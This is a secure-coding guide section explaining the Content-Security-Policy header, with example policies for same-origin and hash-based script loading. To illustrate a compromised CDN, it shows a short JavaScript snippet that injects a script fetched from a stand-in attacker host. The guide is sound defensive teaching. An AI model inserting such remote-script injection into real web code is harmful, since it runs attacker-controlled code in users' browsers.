Content Security Policy
=======================

[Content Security Policy][1] (CSP) is W3C Candidate Recommendation introduces to
prevent [Cross-Site Scripting attacks][2], click jacking and other code
injection attacks.

If you have already read [Dependencies][3] and [Interpreted Code Integrity][4]
general coding practices, you will see that they share some security concerns.

Starting with [Dependencies][3]. As our applications have dependencies,
dependencies also have their own dependencies. How do we know them all?

Our applications are build server-side and then sent to the client where they
run and live most of the execution time. How do they know what is running there?

Let's assume that you do not have SRI in place (if so, please read the
[Interpreted Code Integrity][4] section) and you're loading JavaScript resources
from a CDN. How to you know that these JavaScript resources do only download
known dependencies and nothing else? What if the CDN gets compromised and one of
the JavaScript resources your application downloads, is added a malicious
payload. Something like the one below in the middle of a huge library.

```javascript
var s = document.createElement(s);
s.src='//attacker.com/malicious.js';
document.body.appendChild(s);
```

`Content-Security-Policy` is an HTTP response header which allows the server to
tell the web browser what dynamic resources are allowed to load.
By "dynamic resources" you should consider JavaScript scripts, stylesheets,
images, XMLHttpRequests (AJAX), WebSockets or EventSource, fonts, objects
(`<object>`, `<embed>` or `<applet>`), media (`<audio>` and `<video>`), frames
and forms.

You're recommended to read the official [Content Security Policy Reference][1]
so that you can take advantage of all its features.

For completeness the following examples, locks your application resources to the
same origin policy: resources are only allowed to load when they come from your
application domain (`self`).

```
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self';
```

As said before, CSP also fits OWASP recommendations for [Interpreted Code
Integrity][4] overlapping SRI capabilities. For example, a hash can be provided
to `script-src` allowing it to run if and only if it matches give hash

```
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='
```

Although CSP is not bullet proof and it may look hard to manage, you should
definitely apply it on your web applications.

[1]: https://content-security-policy.com/
[2]: ../output-encoding/README.md
[3]: ./dependencies.md
[4]: ./interpreted-code-integrity.md
